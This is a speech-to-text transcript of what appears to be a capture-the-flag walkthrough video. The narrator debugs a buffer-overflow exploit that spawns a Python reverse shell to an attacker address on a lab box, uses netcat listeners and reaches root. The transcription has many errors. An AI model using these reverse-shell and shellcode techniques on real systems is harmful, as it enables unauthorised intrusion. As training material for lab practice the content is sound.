exactly what we want um we just sag fault because we don't have python 3 or python 2. so let's edit buff python3 that's already there python3 buff.pi grab this code one two three paste and see oh let's see there we go slash off keys one two three paste i don't know why it still thinks i'm in gdb unable to decode the command from the command line one two three four what let's do egdb auth keys run one two three paste now we should break on that return run it again so we got um this is rax then the next return we have is rdi odx syscall see doing a syscall 59 this string use a local bin python 3. so that is correct and then rsi was it xg d8 so this is going to be python this is going to be dash c and this is going to be over a shell that's all correct and we still sack fall is there a very shell code bed cat uh we can just grab it here buff.pi less so we can grab this user local bin python3 c remember shellcode is fine there's got to be something stupid i'm missing one two three python three buff dot pi paste i really don't know why he's getting this unable to decode command from command line let's just try that export command again lc c type is equal to c utf-8 and see if that gets rid of this error it doesn't surrogate's not allowed i can echo that just fine if i copy off keys one two three paste see i got rid of the equals and that doesn't do it um let's get rid of that l just that's like the only thing i can think we've really changed so buff dot pi we can get rid of l adjust which is going to shrink it all keys one two three paste and see lvmp443 and no see gonna clear everything and we're just going to start from scratch well not start to exploit again but start our thought process again because i am baffled okay let's get this error message again and i'm going to google what this is so let's go firefox put this in quotes go to the next thing what is that let's see android plate python it's looking like it's all python so let's go back to the reverse shell code because it seems like we introduced it when we created the reverse shell oh that's probably like 15 minutes of your time wasted because i forgot to pull a null bite there i bet we can do this whole adjusting thing again probably should not change two things at once but i'm confident it was that null byte one two three four connection refused nc nclvmp 443 sudo okay so that works so we can edit pump.pi python3 change this back to two because that's what's running on the box and we can change this to be 1010 so 10 10 14 2 480 python 3 buff.pi pseudo nc lvmp and we go to this intended which is the vm name uh horrible horrible name it can mention name both my test vm and target as the same thing uh hindsight 2020. so sh i pub on this and it works i'm not sure what we had wrong with anything at this point but we go to root we can get root.text i want to just try this real quick um if we get rid of shell there and put this shell is it literally like my reverse shell that's breaking was that the thing pseudo nc lvnp like that hold on we have to python 3 buff.pi to copy it v exploit.pub put the new one in dash i yeah it doesn't like my fancy web cradle but has no problem with the reverse shell so not sure exactly what's going on with my fancy web cradle uh maybe we'll test this out i wonder if we can have two ports i wonder if uh the gateway can get out on port 80. it seems to have less firewall restrictions so let's go 10 10 14 2 i mean i'm not an 80 um 443 so python 3 buff.pi pseudo nc lvmp 443 exploit.pub okay so we can get here so what i want to do is run the python one-liner so if we cat buff.pi go all the way up and run this command i wonder if it's because we don't have like a semicolon or something silly has an effect as before though so python 2. paste oh oh god okay um python 2 c did not like that copy okay b64 okay let's copy this python2 c paste sudo nc lvmp 80 no module named requests so that's where we were getting screwed up we wasted probably 20 minutes i would say because the gateway doesn't have the request module so that's why my fancy web cradle did not work but when we switched to reverse shells it did um it's annoying thing about python and troubleshooting like exploits like this never know exactly what the target is but hope you guys enjoyed that take care and i will see you all next week